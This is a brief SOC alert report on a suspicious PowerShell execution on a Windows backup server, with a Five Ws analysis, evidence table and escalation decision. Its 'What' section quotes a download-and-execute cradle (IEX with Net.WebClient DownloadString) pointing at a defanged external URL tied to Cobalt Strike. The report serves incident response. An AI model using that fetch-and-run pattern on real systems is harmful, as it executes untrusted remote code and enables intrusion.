# ⚙️ Alert Report — Suspicious PowerShell Execution

**Date:** 2025-04-02  
**Analyst:** Daniel K.  
**Alert ID:** SOC-2025-00402  
**Verdict:** ✅ True Positive  
**Severity:** High  

---

## 🧩 Five Ws Analysis

**Who:**  
System account *svc-backup* on host *WIN-SRV02* executed PowerShell via Scheduled Task.

**What:**  
PowerShell invoked *IEX (New-Object Net.WebClient).DownloadString()*  
URL: *hxxp://198.51.100.24/update.ps1*

**When:**  
Detected at 03:17 CET during scheduled maintenance window.

**Where:**  
Host IP: 10.0.4.22, Server OU: BackupServers

**Why:**  
The script attempted outbound communication to an unapproved external IP.  
No hash match in internal whitelist. Domain newly registered.

---

## 🧪 Evidence Collected

| Source | Evidence |
|--------|-----------|
| Sysmon | Event ID 1 (Process Creation), Event ID 3 (Network Connection) |
| Defender | Alert: “Suspicious PowerShell Command Line” |
| URL Reputation | Malicious, linked to Cobalt Strike payloads |
| Network Logs | Outbound traffic on TCP/443, SNI mismatch |

---

## 🧠 Analyst Notes

Process terminated automatically by Defender.  
No persistence observed.  
Recommend full host scan and password reset for *svc-backup* account.

---

## 🚩 Escalation Decision

**Escalated to L2** —  
Further investigation required to verify if lateral movement or persistence mechanisms were established.
